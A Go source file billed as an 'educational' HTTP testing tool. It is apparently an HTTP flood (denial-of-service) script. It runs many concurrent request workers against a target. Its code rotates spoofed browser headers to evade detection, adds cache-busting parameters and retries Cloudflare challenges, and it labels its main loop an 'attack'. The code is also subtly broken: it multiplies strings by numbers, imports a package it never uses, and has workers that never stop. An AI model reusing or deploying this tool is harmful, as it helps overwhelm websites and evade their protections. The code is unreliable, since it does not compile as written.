package main

/*
Advanced HTTP Testing Tool with Cloudflare Bypass
Educational and Testing Purposes Only
Version: 2.2.0 - Termux Optimized
*/

import (
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
	"regexp"
	"bytes"
	"runtime"
	"path/filepath"
)

const version = "2.2.0"

// Advanced configuration
type Config struct {
	TargetURL      string
	MaxConcurrency int
	Duration       time.Duration
	UserAgents     []string
	Headers        map[string]string
	Proxies        []string
	UseTLS         bool
	SkipVerify     bool
	RateLimit      int
	Timeout        time.Duration
	BypassMode     string
	SessionFile    string
	CustomCF       bool
	JSCheck        bool
	ChallengeDelay time.Duration
	TermuxMode     bool
	ConfigFile     string
	LogFile        string
	Verbose        bool
}

// Cloudflare challenge response
type CFChallenge struct {
	Challenge string `json:"challenge"`
	Token     string `json:"token"`
	Success   bool   `json:"success"`
}

// Statistics tracking
type Stats struct {
	RequestsSent   int64
	ResponsesOK    int64
	ResponsesError int64
	BytesReceived  int64
	StartTime      time.Time
}

var (
	config Config
	stats  Stats
	client *http.Client
	cookieJar *cookiejar.Jar
	cfBypassRegex *regexp.Regexp
	challengeRegex *regexp.Regexp
	logFile *os.File
	termuxDetected bool
)

func main() {
	// Detect Termux environment
	detectTermux()
	
	// Parse command line arguments
	parseFlags()
	
	// Initialize configuration
	initializeConfig()
	
	// Display warning
	displayWarning()
	
	// Initialize logging
	initializeLogging()
	
	// Initialize HTTP client
	initializeClient()
	
	// Initialize Cloudflare bypass
	initializeCFBypass()
	
	// Start attack
	startAttack()
	
	// Cleanup
	cleanup()
}

func detectTermux() {
	// Check for Termux environment
	termuxDetected = os.Getenv("TERMUX_VERSION") != "" || 
		os.Getenv("PREFIX") == "/data/data/com.termux/files/usr" ||
		filepath.Base(os.Args[0]) == "termux"
	
	if termuxDetected {
		// Set Termux-specific optimizations
		runtime.GOMAXPROCS(runtime.NumCPU())
	}
}

func parseFlags() {
	var (
		target      = flag.String("target", "", "Target URL (required)")
		concurrency = flag.Int("concurrency", 100, "Number of concurrent requests")
		duration    = flag.String("duration", "60s", "Attack duration")
		useragent   = flag.String("useragent", "", "Custom user agent file")
		proxy       = flag.String("proxy", "", "Proxy file (one per line)")
		rate        = flag.Int("rate", 0, "Requests per second (0 = unlimited)")
		timeout     = flag.String("timeout", "30s", "Request timeout")
		usetls      = flag.Bool("tls", true, "Use TLS/HTTPS")
		skipverify  = flag.Bool("skip-verify", false, "Skip TLS certificate verification")
		headers     = flag.String("headers", "", "Custom headers file")
		bypassmode  = flag.String("bypass", "auto", "Cloudflare bypass mode: auto, stealth, aggressive, custom")
		session     = flag.String("session", "", "Session file to save/load cookies")
		customcf    = flag.Bool("custom-cf", false, "Use custom Cloudflare headers")
		jscheck     = flag.Bool("js-check", true, "Enable JavaScript challenge detection")
		challenge   = flag.String("challenge-delay", "5s", "Delay between challenge attempts")
		configfile  = flag.String("config", "", "Configuration file (JSON)")
		logfile     = flag.String("log", "", "Log file path")
		verbose     = flag.Bool("verbose", false, "Verbose output")
		termux      = flag.Bool("termux", termuxDetected, "Force Termux mode")
	)
	
	flag.Parse()
	
	if *target == "" {
		fmt.Println("Error: Target URL is required")
		fmt.Println("Usage: go run advanced_http_tool.go -target=https://example.com")
		os.Exit(1)
	}
	
	config.TargetURL = *target
	config.MaxConcurrency = *concurrency
	config.UseTLS = *usetls
	config.SkipVerify = *skipverify
	config.RateLimit = *rate
	config.BypassMode = *bypassmode
	config.SessionFile = *session
	config.CustomCF = *customcf
	config.JSCheck = *jscheck
	config.TermuxMode = *termux
	config.ConfigFile = *configfile
	config.LogFile = *logfile
	config.Verbose = *verbose
	
	// Parse duration
	if d, err := time.ParseDuration(*duration); err == nil {
		config.Duration = d
	} else {
		config.Duration = 60 * time.Second
	}
	
	// Parse timeout
	if t, err := time.ParseDuration(*timeout); err == nil {
		config.Timeout = t
	} else {
		config.Timeout = 30 * time.Second
	}
	
	// Parse challenge delay
	if d, err := time.ParseDuration(*challenge); err == nil {
		config.ChallengeDelay = d
	} else {
		config.ChallengeDelay = 5 * time.Second
	}
	
	// Load user agents
	if *useragent != "" {
		loadUserAgents(*useragent)
	} else {
		loadDefaultUserAgents()
	}
	
	// Load proxies
	if *proxy != "" {
		loadProxies(*proxy)
	}
	
	// Load headers
	if *headers != "" {
		loadHeaders(*headers)
	} else {
		loadDefaultHeaders()
	}
}

func initializeConfig() {
	stats.StartTime = time.Now()
	
	// Load config file if specified
	if config.ConfigFile != "" {
		loadConfigFile()
	}
	
	// Termux-specific optimizations
	if config.TermuxMode {
		// Reduce concurrency for mobile devices
		if config.MaxConcurrency > 50 {
			config.MaxConcurrency = 50
		}
		// Set default log file if not specified
		if config.LogFile == "" {
			config.LogFile = "~/http_tool.log"
		}
	}
}

func displayWarning() {
	fmt.Println("=" * 60)
	fmt.Println("ADVANCED HTTP TESTING TOOL")
	fmt.Println("Version:", version)
	if config.TermuxMode {
		fmt.Println("Termux Mode: ENABLED")
	}
	fmt.Println("=" * 60)
	fmt.Println("WARNING: This tool is for educational and testing purposes only!")
	fmt.Println("Only use on systems you own or have explicit permission to test.")
	fmt.Println("Unauthorized use may violate laws and terms of service.")
	fmt.Println("=" * 60)
	fmt.Println()
}

func initializeLogging() {
	if config.LogFile != "" {
		// Expand ~ to home directory
		if strings.HasPrefix(config.LogFile, "~/") {
			homeDir, err := os.UserHomeDir()
			if err == nil {
				config.LogFile = filepath.Join(homeDir, config.LogFile[2:])
			}
		}
		
		var err error
		logFile, err = os.OpenFile(config.LogFile, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
		if err != nil {
			fmt.Printf("Warning: Could not open log file %s: %v\n", config.LogFile, err)
		}
	}
}

func logMessage(message string) {
	if logFile != nil {
		timestamp := time.Now().Format("2006-01-02 15:04:05")
		logFile.WriteString(fmt.Sprintf("[%s] %s\n", timestamp, message))
	}
	if config.Verbose {
		fmt.Println(message)
	}
}

func loadConfigFile() {
	data, err := os.ReadFile(config.ConfigFile)
	if err != nil {
		fmt.Printf("Warning: Could not read config file %s: %v\n", config.ConfigFile, err)
		return
	}
	
	var fileConfig Config
	if err := json.Unmarshal(data, &fileConfig); err != nil {
		fmt.Printf("Warning: Could not parse config file %s: %v\n", config.ConfigFile, err)
		return
	}
	
	// Merge config (file config overrides command line)
	if fileConfig.MaxConcurrency > 0 {
		config.MaxConcurrency = fileConfig.MaxConcurrency
	}
	if fileConfig.Duration > 0 {
		config.Duration = fileConfig.Duration
	}
	if fileConfig.RateLimit > 0 {
		config.RateLimit = fileConfig.RateLimit
	}
	if fileConfig.Timeout > 0 {
		config.Timeout = fileConfig.Timeout
	}
	if fileConfig.BypassMode != "" {
		config.BypassMode = fileConfig.BypassMode
	}
	if fileConfig.SessionFile != "" {
		config.SessionFile = fileConfig.SessionFile
	}
	if fileConfig.CustomCF {
		config.CustomCF = fileConfig.CustomCF
	}
	if !fileConfig.JSCheck {
		config.JSCheck = fileConfig.JSCheck
	}
	if fileConfig.ChallengeDelay > 0 {
		config.ChallengeDelay = fileConfig.ChallengeDelay
	}
	if len(fileConfig.UserAgents) > 0 {
		config.UserAgents = fileConfig.UserAgents
	}
	if len(fileConfig.Headers) > 0 {
		config.Headers = fileConfig.Headers
	}
	if len(fileConfig.Proxies) > 0 {
		config.Proxies = fileConfig.Proxies
	}
}

func cleanup() {
	if logFile != nil {
		logFile.Close()
	}
	if config.SessionFile != "" {
		saveSession()
	}
}

func initializeClient() {
	// Create cookie jar for session management
	var err error
	cookieJar, err = cookiejar.New(nil)
	if err != nil {
		fmt.Printf("Error creating cookie jar: %v\n", err)
		os.Exit(1)
	}
	
	// Create custom transport
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: config.SkipVerify,
		},
		MaxIdleConns:        config.MaxConcurrency,
		MaxIdleConnsPerHost: config.MaxConcurrency,
		IdleConnTimeout:     90 * time.Second,
		DisableKeepAlives:   false,
		DisableCompression:  true,
		DialContext: (&net.Dialer{
			Timeout:   config.Timeout,
			KeepAlive: 30 * time.Second,
		}).DialContext,
	}
	
	// Add proxy support if configured
	if len(config.Proxies) > 0 {
		// Random proxy selection will be handled in request function
	}
	
	client = &http.Client{
		Transport: transport,
		Timeout:   config.Timeout,
		Jar:       cookieJar,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse // Don't follow redirects
		},
	}
}

func initializeCFBypass() {
	// Initialize regex patterns for Cloudflare detection
	var err error
	cfBypassRegex, err = regexp.Compile(`(?i)(cloudflare|cf-ray|cf-cache-status|cf-request-id)`)
	if err != nil {
		fmt.Printf("Error compiling CF regex: %v\n", err)
		os.Exit(1)
	}
	
	challengeRegex, err = regexp.Compile(`(?i)(challenge-platform|cf-challenge|jschl-answer|jschl_vc)`)
	if err != nil {
		fmt.Printf("Error compiling challenge regex: %v\n", err)
		os.Exit(1)
	}
	
	// Load session if specified
	if config.SessionFile != "" {
		loadSession()
	}
}

func loadDefaultUserAgents() {
	if config.TermuxMode {
		// Mobile-optimized user agents for Termux
		config.UserAgents = []string{
			"Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
			"Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
			"Mozilla/5.0 (Linux; Android 11; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
			"Mozilla/5.0 (Linux; Android 13; SM-A525F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
			"Mozilla/5.0 (Linux; Android 12; OnePlus 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
			"Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
			"Mozilla/5.0 (Linux; Android 12; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
			"Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
		}
	} else {
		// Desktop user agents
		config.UserAgents = []string{
			"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
			"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
			"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
			"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36",
			"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
			"Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0",
		}
	}
}

func loadUserAgents(filename string) {
	// Implementation to load user agents from file
	// For now, use default
	loadDefaultUserAgents()
}

func loadProxies(filename string) {
	// Implementation to load proxies from file
	// For now, use empty list
	config.Proxies = []string{}
}

func loadHeaders(filename string) {
	// Implementation to load headers from file
	// For now, use default
	loadDefaultHeaders()
}

func loadDefaultHeaders() {
	config.Headers = map[string]string{
		"Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
		"Accept-Language":           "en-US,en;q=0.9",
		"Accept-Encoding":           "gzip, deflate, br",
		"DNT":                       "1",
		"Connection":                "keep-alive",
		"Upgrade-Insecure-Requests": "1",
		"Sec-Fetch-Dest":            "document",
		"Sec-Fetch-Mode":            "navigate",
		"Sec-Fetch-Site":            "none",
		"Sec-Fetch-User":            "?1",
		"Cache-Control":             "max-age=0",
		"sec-ch-ua":                 `"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"`,
		"sec-ch-ua-mobile":          "?0",
		"sec-ch-ua-platform":        `"Windows"`,
	}
}

func loadSession() {
	// Load session from file
	// Implementation for session loading
}

func saveSession() {
	// Save session to file
	// Implementation for session saving
}

func detectCloudflare(resp *http.Response) bool {
	// Check headers for Cloudflare indicators
	for name, values := range resp.Header {
		if cfBypassRegex.MatchString(name) {
			return true
		}
		for _, value := range values {
			if cfBypassRegex.MatchString(value) {
				return true
			}
		}
	}
	return false
}

func detectChallenge(resp *http.Response, body []byte) bool {
	// Check for JavaScript challenge
	if resp.StatusCode == 403 || resp.StatusCode == 503 {
		bodyStr := string(body)
		return challengeRegex.MatchString(bodyStr) || strings.Contains(bodyStr, "challenge-platform")
	}
	return false
}

func handleCloudflareChallenge(req *http.Request, resp *http.Response, body []byte) (*http.Response, error) {
	fmt.Println("Cloudflare challenge detected, attempting bypass...")
	
	// Extract challenge parameters
	bodyStr := string(body)
	
	// Look for jschl-answer calculation
	if strings.Contains(bodyStr, "jschl-answer") {
		// Simple delay to simulate human behavior
		time.Sleep(config.ChallengeDelay)
		
		// Add challenge-specific headers
		req.Header.Set("Referer", config.TargetURL)
		req.Header.Set("Origin", getOriginFromURL(config.TargetURL))
		
		// Retry request
		return client.Do(req)
	}
	
	return resp, nil
}

func getOriginFromURL(targetURL string) string {
	u, err := url.Parse(targetURL)
	if err != nil {
		return ""
	}
	return fmt.Sprintf("%s://%s", u.Scheme, u.Host)
}

func applyBypassHeaders(req *http.Request) {
	// Apply different bypass strategies based on mode
	switch config.BypassMode {
	case "stealth":
		applyStealthHeaders(req)
	case "aggressive":
		applyAggressiveHeaders(req)
	case "custom":
		applyCustomHeaders(req)
	default: // auto
		applyAutoHeaders(req)
	}
}

func applyStealthHeaders(req *http.Request) {
	// Stealth mode - minimal headers to avoid detection
	req.Header.Del("User-Agent")
	req.Header.Set("User-Agent", config.UserAgents[rand.Intn(len(config.UserAgents))])
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.5")
	req.Header.Set("Accept-Encoding", "gzip, deflate")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Upgrade-Insecure-Requests", "1")
}

func applyAggressiveHeaders(req *http.Request) {
	// Aggressive mode - many headers to confuse detection
	req.Header.Set("User-Agent", config.UserAgents[rand.Intn(len(config.UserAgents))])
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9,es;q=0.8,fr;q=0.7,de;q=0.6")
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("Cache-Control", "no-cache")
	req.Header.Set("Pragma", "no-cache")
	req.Header.Set("DNT", "1")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Upgrade-Insecure-Requests", "1")
	req.Header.Set("Sec-Fetch-Dest", "document")
	req.Header.Set("Sec-Fetch-Mode", "navigate")
	req.Header.Set("Sec-Fetch-Site", "none")
	req.Header.Set("Sec-Fetch-User", "?1")
	req.Header.Set("sec-ch-ua", `"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"`)
	req.Header.Set("sec-ch-ua-mobile", "?0")
	req.Header.Set("sec-ch-ua-platform", `"Windows"`)
}

func applyCustomHeaders(req *http.Request) {
	// Custom mode - use custom headers from config
	for key, value := range config.Headers {
		req.Header.Set(key, value)
	}
}

func applyAutoHeaders(req *http.Request) {
	// Auto mode - intelligent header selection
	userAgent := config.UserAgents[rand.Intn(len(config.UserAgents))]
	req.Header.Set("User-Agent", userAgent)
	
	// Detect browser type from user agent
	if strings.Contains(userAgent, "Chrome") {
		req.Header.Set("sec-ch-ua", `"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"`)
		req.Header.Set("sec-ch-ua-mobile", "?0")
		req.Header.Set("sec-ch-ua-platform", `"Windows"`)
	}
	
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Upgrade-Insecure-Requests", "1")
	req.Header.Set("Cache-Control", "max-age=0")
}

func startAttack() {
	fmt.Printf("Target: %s\n", config.TargetURL)
	fmt.Printf("Concurrency: %d\n", config.MaxConcurrency)
	fmt.Printf("Duration: %v\n", config.Duration)
	fmt.Printf("Rate Limit: %d req/s\n", config.RateLimit)
	fmt.Println()
	
	// Create worker pool
	var wg sync.WaitGroup
	semaphore := make(chan struct{}, config.MaxConcurrency)
	
	// Rate limiter
	var rateLimiter <-chan time.Time
	if config.RateLimit > 0 {
		rateLimiter = time.Tick(time.Second / time.Duration(config.RateLimit))
	}
	
	// Start workers
	for i := 0; i < config.MaxConcurrency; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			worker(semaphore, rateLimiter)
		}()
	}
	
	// Setup signal handling
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	
	// Start statistics display
	go displayStats()
	
	// Wait for duration or signal
	select {
	case <-time.After(config.Duration):
		fmt.Println("\nAttack completed after duration")
	case <-sigChan:
		fmt.Println("\nAttack interrupted by user")
	}
	
	// Wait for workers to finish
	wg.Wait()
	
	// Display final statistics
	displayFinalStats()
}

func worker(semaphore chan struct{}, rateLimiter <-chan time.Time) {
	for {
		// Rate limiting
		if rateLimiter != nil {
			<-rateLimiter
		}
		
		// Acquire semaphore
		semaphore <- struct{}{}
		
		// Make request
		makeRequest()
		
		// Release semaphore
		<-semaphore
	}
}

func makeRequest() {
	// Create request
	req, err := http.NewRequest("GET", config.TargetURL, nil)
	if err != nil {
		atomic.AddInt64(&stats.ResponsesError, 1)
		return
	}
	
	// Apply bypass headers
	applyBypassHeaders(req)
	
	// Add random parameters to bypass caching
	params := req.URL.Query()
	params.Set("_t", strconv.FormatInt(time.Now().UnixNano(), 10))
	params.Set("_r", generateRandomString(8))
	req.URL.RawQuery = params.Encode()
	
	// Make initial request
	resp, err := client.Do(req)
	if err != nil {
		atomic.AddInt64(&stats.ResponsesError, 1)
		return
	}
	defer resp.Body.Close()
	
	// Read response body
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		atomic.AddInt64(&stats.ResponsesError, 1)
		return
	}
	
	// Check for Cloudflare protection
	if detectCloudflare(resp) {
		fmt.Println("Cloudflare detected, attempting bypass...")
		
		// Handle challenge if detected
		if config.JSCheck && detectChallenge(resp, body) {
			newResp, err := handleCloudflareChallenge(req, resp, body)
			if err == nil && newResp != nil {
				resp = newResp
				// Re-read body after challenge
				if newResp.Body != nil {
					body, _ = io.ReadAll(newResp.Body)
					newResp.Body.Close()
				}
			}
		}
	}
	
	// Update statistics
	atomic.AddInt64(&stats.RequestsSent, 1)
	atomic.AddInt64(&stats.BytesReceived, int64(len(body)))
	
	if resp.StatusCode >= 200 && resp.StatusCode < 400 {
		atomic.AddInt64(&stats.ResponsesOK, 1)
	} else {
		atomic.AddInt64(&stats.ResponsesError, 1)
	}
}

func generateRandomString(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, length)
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	return string(b)
}

func displayStats() {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()
	
	for {
		select {
		case <-ticker.C:
			elapsed := time.Since(stats.StartTime)
			requests := atomic.LoadInt64(&stats.RequestsSent)
			ok := atomic.LoadInt64(&stats.ResponsesOK)
			errors := atomic.LoadInt64(&stats.ResponsesError)
			bytes := atomic.LoadInt64(&stats.BytesReceived)
			
			rate := float64(requests) / elapsed.Seconds()
			
			if config.TermuxMode {
				// Compact display for mobile
				fmt.Printf("\r[%v] Req:%d OK:%d Err:%d Rate:%.1f/s Bytes:%s",
					elapsed.Truncate(time.Second),
					requests, ok, errors, rate, formatBytes(bytes))
			} else {
				// Full display for desktop
				fmt.Printf("\r[%v] Requests: %d | OK: %d | Errors: %d | Rate: %.1f/s | Bytes: %s",
					elapsed.Truncate(time.Second),
					requests, ok, errors, rate, formatBytes(bytes))
			}
			
			// Log statistics
			logMessage(fmt.Sprintf("Stats - Requests: %d, OK: %d, Errors: %d, Rate: %.1f/s", 
				requests, ok, errors, rate))
		}
	}
}

func displayFinalStats() {
	elapsed := time.Since(stats.StartTime)
	requests := atomic.LoadInt64(&stats.RequestsSent)
	ok := atomic.LoadInt64(&stats.ResponsesOK)
	errors := atomic.LoadInt64(&stats.ResponsesError)
	bytes := atomic.LoadInt64(&stats.BytesReceived)
	
	fmt.Println("\n" + "=" * 60)
	fmt.Println("FINAL STATISTICS")
	fmt.Println("=" * 60)
	fmt.Printf("Duration: %v\n", elapsed.Truncate(time.Second))
	fmt.Printf("Total Requests: %d\n", requests)
	fmt.Printf("Successful: %d\n", ok)
	fmt.Printf("Errors: %d\n", errors)
	fmt.Printf("Success Rate: %.2f%%\n", float64(ok)/float64(requests)*100)
	fmt.Printf("Average Rate: %.1f req/s\n", float64(requests)/elapsed.Seconds())
	fmt.Printf("Total Bytes: %s\n", formatBytes(bytes))
	fmt.Printf("Average Response Size: %s\n", formatBytes(bytes/int64(requests)))
	fmt.Println("=" * 60)
}

func formatBytes(bytes int64) string {
	const unit = 1024
	if bytes < unit {
		return fmt.Sprintf("%d B", bytes)
	}
	div, exp := int64(unit), 0
	for n := bytes / unit; n >= unit; n /= unit {
		div *= unit
		exp++
	}
	return fmt.Sprintf("%.1f %cB", float64(bytes)/float64(div), "KMGTPE"[exp])
}
